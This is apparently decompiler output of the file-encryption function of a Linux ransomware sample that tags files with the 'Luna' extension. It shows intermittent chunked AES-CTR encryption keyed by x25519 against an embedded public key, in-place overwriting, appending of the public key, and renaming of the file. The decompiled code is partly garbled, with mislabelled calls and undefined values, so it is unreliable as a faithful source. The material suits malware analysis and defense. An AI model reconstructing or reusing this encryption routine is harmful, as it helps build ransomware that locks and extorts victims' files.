fn linux_encryptor::files::add_file() -> u32 {
    let v0: struct4;  // [bp-0x124c]
    let v1: i64;  // [bp-0x1248], Other Possible Types: struct16, struct8, struct32
    let v2: struct16;  // [sp-0x1228], Other Possible Types: struct32, unsigned long, int
    let v3: iNone;  // [bp-0x1220], Other Possible Types: unsigned long
    let v4: i64;  // [sp-0x1218]
    let v5: i64;  // [sp-0x1200]
    let v6: i64;  // [sp-0x11f8]
    let v7: i64;  // [sp-0x11f0]
    let v8: i64;  // [sp-0x11e8]
    let v9: i64;  // [sp-0x11e0]
    let v10: struct16;  // [sp-0x11d8], Other Possible Types: int
    let v11: iNone;  // [sp-0x11c8]
    let v12: struct32;  // [bp-0x11b8], Other Possible Types: int, struct14, struct8
    let v13: iNone;  // [sp-0x11a8]
    let v14: iNone;  // [sp-0x1188], Other Possible Types: struct32, Result<struct4, struct8>
    let v15: iNone;  // [sp-0x1178]
    let v16: struct16;  // [bp-0x1168], Other Possible Types: int, unsigned long, char, struct32, struct8, struct33
    let v17: iNone;  // [bp-0x1160]
    let v18: i64;  // [sp-0x1160]
    let v19: i64;  // [bp-0x1158], Other Possible Types: int
    let v20: iNone;  // [sp-0x1148]
    let v21: iNone;  // [sp-0x1138]
    let v22: i64;  // [sp-0x10b0]
    let v23: struct32;  // [bp-0x10a8]
    let v24: i64;  // [sp-0x1088], Other Possible Types: struct32
    let v25: i64;  // [sp-0x1080]
    let v26: struct16;  // [bp-0x1068], Other Possible Types: struct8, unsigned long, Result<struct40, struct8>, struct48, struct24, struct32
    let v27: i64;  // [sp-0x1060]
    let v28: i64;  // [bp-0x1058]
    let v29: i8;  // [bp-0x1038]
    let v30: i16;  // [bp-0x38]
    let v32: i64;  // rdi
    let v33: i64;  // rbx
    let v34: iNone;  // xmm0
    let v35: iNone;  // xmm0
    let v37: iNone;  // xmm0
    let v38: iNone;  // xmm0
    let v39: iNone;  // xmm0
    let v40: iNone;  // xmm0
    let v41: iNone;  // ymm0
    let v42: iNone;  // ymm0
    let v43: i64;  // r13
    let v44: i64;  // rdx
    let v45: i64;  // rax
    let v46: i64;  // rcx
    let v47: i64;  // rsi
    let v48: i64;  // cc_ndep
    let v49: i64;  // rsi
    let v50: i64;  // rcx
    let v51: i64;  // rax
    let v52: i64;  // rax
    let v53: i64;  // rax
    let v54: i64;  // rbp
    let v55: i64;  // r15
    let v56: i64;  // rbx
    let v57: i64;  // r14
    let v58: i64;  // rax
    let v59: i64;  // rax
    let v60: i64;  // rbp
    let v61: i64;  // rax
    let v62: i64;  // rdi
    let v63: i64;  // rdx
    let v64: i64;  // rsi
    let v65: i64;  // rax
    let v66: i64;  // r12
    let v67: i64;  // rsi
    let v68: i64;  // r15
    let v69: i64;  // rbx
    let v70: i64;  // rbx

    v7 = v32;
    v12 = std::fs::File::options();
    v14 = std::fs::OpenOptions::_open(std::fs::OpenOptions::write(std::fs::OpenOptions::read(&v12, 1), 1), *(v32 as &i64), *((v32 + 16) as &i64));
    match v14 {
        Err(v2) => {
            goto (*((4534320 + (vvar_1120{stack -4648} as i32 & 3) as u32 as u64 * 4) as &i32) + 4534320) as i64;
        },
        Ok(_) => {
            v0 = struct4 {
                field_0: *((&v14 as &char + 4) as &i32)
            };
            v26 = std::fs::File::metadata(&v0);
            if v26 {
                v16 = struct8 {
                    field_0: *((&v26 as &char + 8) as &i64)
                };
                core::result::unwrap_failed("called `Result::unwrap()` on an `Err` value", &v16, &g_473e70, "src/files.rs"); /* do not return */
            }
            memcpy(&v16, &v26, 176);
            v33 = std::fs::Metadata::len(&v16);
            v12 = struct32 {
                field_0: 0
                field_16: 0
            };
            <rand_core::os::OsRng as rand_core::RngCore>::fill_bytes(&v14, &v12, 32);
            v34 = v12.field_0;
            v26 = struct32 {
                field_0: v34
                field_16: v13
            };
            v16 = x25519_dalek::x25519::clamp_scalar(&v26);
            v35 = v16.field_0;
            v23 = struct32 {
                field_0: v35
                field_16: v16.field_16
            };
            v24 = <x25519_dalek::x25519::PublicKey as core::convert::From<&x25519_dalek::x25519::EphemeralSecret>>::from(&v23);
            v11 = 0;
            v10 = 0;
            memset(&v29, 0, 0x1000);
            v26 = struct48 {
                field_0: &g_45323d
                field_8: 44
                field_16: 0
                field_32: 0
            };
            *(&v30 as &i16) = 0;
            v16 = <base64_stream::from_base64_reader::FromBase64Reader<R,N> as std::io::Read>::read(&v26, &v10);
            if v16 {
                v12 = struct8 {
                    field_0: v16.field_8
                };
                core::result::unwrap_failed("called `Result::unwrap()` on an `Err` value", &v12, &g_473e70, "src/files.rs"); /* do not return */
            }
            v16 = struct32 {
                field_0: v36
                field_16: v11
            };
            v1 = <x25519_dalek::x25519::PublicKey as core::convert::From<[u8; 32]>>::from(&v16);
            v2 = x25519_dalek::x25519::StaticSecret::diffie_hellman(&v23, &v1);
            v14 = curve25519_dalek::montgomery::MontgomeryPoint::to_bytes(&v2);
            v12 = curve25519_dalek::montgomery::MontgomeryPoint::to_bytes(&v24);
            v37 = v14;
            v19 = v15;
            v16 = v37;
            v38 = v12.field_0;
            v20 = v38;
            v21 = v13;
            v2 = x25519_dalek::x25519::_DERIVE_zeroize_Zeroize_FOR_SharedSecret::<impl zeroize::Zeroize for x25519_dalek::x25519::SharedSecret>::zeroize();
            v23 = x25519_dalek::x25519::_DERIVE_Drop_FOR_EphemeralSecret::<impl core::ops::drop::Drop for x25519_dalek::x25519::EphemeralSecret>::drop();
            v39 = v16 as i128;
            v15 = v19 as i128;
            v14 = v39;
            v40 = v20;
            v42 = ...;
            v13 = v21;
            v12 = v40;
            v43 = crypto::aes::ctr();
            v24 = v43;
            v25 = v44;
            v45 = v33 / 0x50000 * 30;
            v8 = v33;
            if v45 >= 60100 {
                v5 = v44;
                v6 = v43;
                v46 = 3941875194382007691;
                v9 = (v33 - 0xbb80000) / 599;
                v47 = 599;
                goto LABEL_40a338;
            }
            if !(!(v45 >= 100) || !(!(amd64g_calculate_condition(2, 6, v45 - 100 & 4294967295 & 65535, 100, v48) as char))) {
                v5 = v44;
                v6 = v43;
                v49 = ((v45 as u32 >> 2) * 5243 >> 17) as u64;
                v50 = v49;
                v46 = v50 - 1;
                if v50 == 1 {
                    core::panicking::panic("attempt to divide by zero", "src/files.rs"); /* do not return */
                }
                if !(amd64g_calculate_condition(2, 6, v45 & 65535, 100, v48) as char) {
                    v52 = v8 - v49 * 0x50000;
                    if !(v52 | v46) >> 32 {
                        v9 = (((0 CONCAT v52 as u32) % (v46 & 4294967295)) as u32 CONCAT ((0 CONCAT v52 as u32) / (v46 & 4294967295)) as u32) & 4294967295;
                        v47 = v49 - 1;
                        if !(!v49 - 1) {
                            goto LABEL_40a338;
                        }
                    } else {
                        v9 = (((0 CONCAT v52) % v46 as u128) as u64 CONCAT ((0 CONCAT v52) / v46 as u128) as u64) as u64;
                        v47 = v49 - 1;
                        if v49 != 1 {
LABEL_40a338:
                            v9 += 0x50000;
                            v57 = 0;
                            do {
                                v22 = v47;
                                v59 = __rust_alloc(0x50000, 1);
                                v60 = v59;
                                v2 = v59;
                                memset(v59, 0, 0x50000);
                                *(&v3 as &i128) = 0x500000000000000050000;
                                v61 = __rust_alloc(0x50000, 1);
                                v16 = v61;
                                v62 = v61;
                                memset(v61, 0, 0x50000);
                                v42 = (v42 & 0xffffffffffffffffffffffffffffffff00000000000000000000000000000000 | 0x500000000000000050000) & 0xffffffffffffffffffffffffffffffff00000000000000000000000000000000 | 0x500000000000000050000;
                                *(&v17 as &i128) = 0x500000000000000050000;
                                v26 = struct16 {
                                    field_0: 0
                                    field_8: v57
                                };
                                v1 = <std::fs::File as std::io::Seek>::seek(&v0, &v26);
                                if v1 {
                                    v26 = struct8 {
                                        field_0: v1.field_8
                                    };
                                    core::result::unwrap_failed("Can't seek file.", &v26, &g_473e70, "src/files.rs"); /* do not return */
                                }
                                v63 = v60;
                                v26 = <std::process::ChildStdout as std::io::Read>::read(&v0, v60, 0x50000);
                                if v26 {
                                    v1 = struct8 {
                                        field_0: v27
                                    };
                                    core::result::unwrap_failed("Can't read file.", &v1, &g_473e70, "src/files.rs"); /* do not return */
                                }
                                *((v5 + 24) as &i64)();
                                v26 = struct16 {
                                    field_0: 0
                                    field_8: v57
                                };
                                v1 = <std::fs::File as std::io::Seek>::seek(&v0, &v26);
                                if v1 {
                                    v26 = struct8 {
                                        field_0: v1.field_8
                                    };
                                    core::result::unwrap_failed("Can't seek file.", &v26, &g_473e70, "src/files.rs"); /* do not return */
                                }
                                v10 = std::os::unix::net::datagram::UnixDatagram::send(&v0, v61, 0x50000);
                                if v10.field_0 {
                                    println!("Error while writing encrypted data to: {}", &v7);
                                    v66 = v5;
                                    *(v66 as &i64)();
                                    return;
                                }
                                v57 += v9;
                                v64 = v22;
                                v47 = v64 - 1;
                            } while (v64 != 1);
                        }
                    }
                }
LABEL_40ab71:
                v26 = struct16 {
                    field_0: 0
                    field_8: v8
                };
                v16 = <std::fs::File as std::io::Seek>::seek(&v0, &v26);
                v66 = v5;
                if v16 {
                    v26 = struct8 {
                        field_0: v18
                    };
                    core::result::unwrap_failed("Can't seek file.", &v26, &g_473e70, "src/files.rs"); /* do not return */
                }
                v2 = std::os::unix::net::datagram::UnixDatagram::send(&v0, &v12, 32);
                if v2 {
                    println!("Error while writing public key to: {}", &v7);
                    *(v66 as &i64)();
                    return;
                }
                v26 = struct16 {
                    field_0: 0
                    field_8: v27 + 32
                };
                v16 = <std::fs::File as std::io::Seek>::seek(&v0, &v26);
                if v16 {
                    v26 = struct8 {
                        field_0: v18
                    };
                    core::result::unwrap_failed("Can't seek file.", &v26, &g_473e70, "src/files.rs"); /* do not return */
                }
                v2 = std::os::unix::net::datagram::UnixDatagram::send(&v0, "Luna");
                if v2 {
                    println!("Error while writing extension to: {}", &v7);
                    *(v66 as &i64)();
                    return;
                }
                v26 = <alloc::string::String as core::clone::Clone>::clone(v32);
                v67 = v26.field_16;
                if v27 == v67 {
                    v26 = alloc::raw_vec::RawVec<T,A>::reserve::do_reserve_and_handle(v67, 1);
                    v67 = v26.field_16;
                }
                *((v26 + v67) as &i8) = 46;
                v16 = v26;
                v26 = core::str::converts::from_utf8("Luna");
                if v26 {
                    *(&v2 as &i128) = *((&v26 as &char + 8) as &i128);
                    core::result::unwrap_failed("called `Result::unwrap()` on an `Err` value", &v2, &g_473eb0, "src/files.rs"); /* do not return */
                }
                v68 = *((&v26 as &char + 16) as &i64);
                v69 = (&v16)[16] as i64;
                if v18 - v69 < v68 {
                    v16 = alloc::raw_vec::RawVec<T,A>::reserve::do_reserve_and_handle(v69, v68);
                    v69 = (&v16)[16] as i64;
                }
                memcpy(v16 + v69, v27, v68);
                v70 = v69 + v68;
                v28 = v70;
                v26 = v16;
                v1 = std::sys::unix::fs::rename(*(v32 as &i64), *((v32 + 16) as &i64), v26, v70);
                if !v1 {
                    *(v66 as &i64)();
                    return;
                }
                println!("Error while renaming file: {}", &v7);
            } else if v33 > 327679 {
                v51 = __rust_alloc(0x50000, 1);
                v2 = v51;
                memset(v51, 0, 0x50000);
                *(&v3 as &i128) = 0x500000000000000050000;
                v58 = __rust_alloc(0x50000, 1);
                v16 = v58;
                memset(v58, 0, 0x50000);
                *(&v17 as &i128) = 0x500000000000000050000;
                v26 = struct16 {
                    field_0: 0
                    field_8: 0
                };
                v1 = <std::fs::File as std::io::Seek>::seek(&v0, &v26);
                if v1 {
                    v26 = struct8 {
                        field_0: v1.field_8
                    };
                    core::result::unwrap_failed("Can't seek file.", &v26, &g_473e70, "src/files.rs"); /* do not return */
                }
                v26 = <std::process::ChildStdout as std::io::Read>::read(&v0, v51, 0x50000);
                if v26 {
                    v1 = struct8 {
                        field_0: v27
                    };
                    core::result::unwrap_failed("Can't read file.", &v1, &g_473e70, "src/files.rs"); /* do not return */
                }
                *((v66 + 24) as &i64)();
                v26 = struct16 {
                    field_0: 0
                    field_8: 0
                };
                v1 = <std::fs::File as std::io::Seek>::seek(&v0, &v26);
                if v1 {
                    v26 = struct8 {
                        field_0: v1.field_8
                    };
                    core::result::unwrap_failed("Can't seek file.", &v26, &g_473e70, "src/files.rs"); /* do not return */
                }
                v10 = std::os::unix::net::datagram::UnixDatagram::send(&v0, v58, 0x50000);
                if !v10.field_0 {
                    goto LABEL_40ab71;
                } else {
                    println!("Error while writing encrypted data to: {}", &v7);
                }
            } else {
                if !v33 {
                    v54 = v33;
                    v2 = 1;
                    *(&v3 as &i128) = 0;
                    v16 = 1;
                    *(&v17 as &i128) = 0;
                    v55 = 1;
                    v56 = 1;
                } else {
                    v53 = __rust_alloc(v33, 1);
                    v55 = v53;
                    v2 = v53;
                    v3 = v33;
                    memset(v53, 0, v33);
                    v4 = v33;
                    v65 = __rust_alloc(v33, 1);
                    v16 = v65;
                    v18 = v33;
                    memset(v65, 0, v33);
                    v54 = v33;
                    v19 = v33;
                    v56 = v65;
                }
                v26 = struct16 {
                    field_0: 0
                    field_8: 0
                };
                v1 = <std::fs::File as std::io::Seek>::seek(&v0, &v26);
                if v1 {
                    v26 = struct8 {
                        field_0: v1.field_8
                    };
                    core::result::unwrap_failed("Can't seek file.", &v26, &g_473e70, "src/files.rs"); /* do not return */
                }
                v26 = <std::process::ChildStdout as std::io::Read>::read(&v0, v55, v54);
                if v26 {
                    v1 = struct8 {
                        field_0: v27
                    };
                    core::result::unwrap_failed("Can't read file.", &v1, &g_473e70, "src/files.rs"); /* do not return */
                }
                *((v66 + 24) as &i64)();
                v26 = struct16 {
                    field_0: 0
                    field_8: 0
                };
                v1 = <std::fs::File as std::io::Seek>::seek(&v0, &v26);
                if v1 {
                    v26 = struct8 {
                        field_0: v1.field_8
                    };
                    core::result::unwrap_failed("Can't seek file.", &v26, &g_473e70, "src/files.rs"); /* do not return */
                }
                v10 = std::os::unix::net::datagram::UnixDatagram::send(&v0, v56, v8);
                if !v10.field_0 {
                    v5 = v66;
                    v6 = v43;
                    if v8 {
                        goto LABEL_40ab71;
                    }
                } else {
                    println!("Error while writing encrypted data to: {}", &v7);
                }
            }
            *(v66 as &i64)();
            return;
        },
    }
}
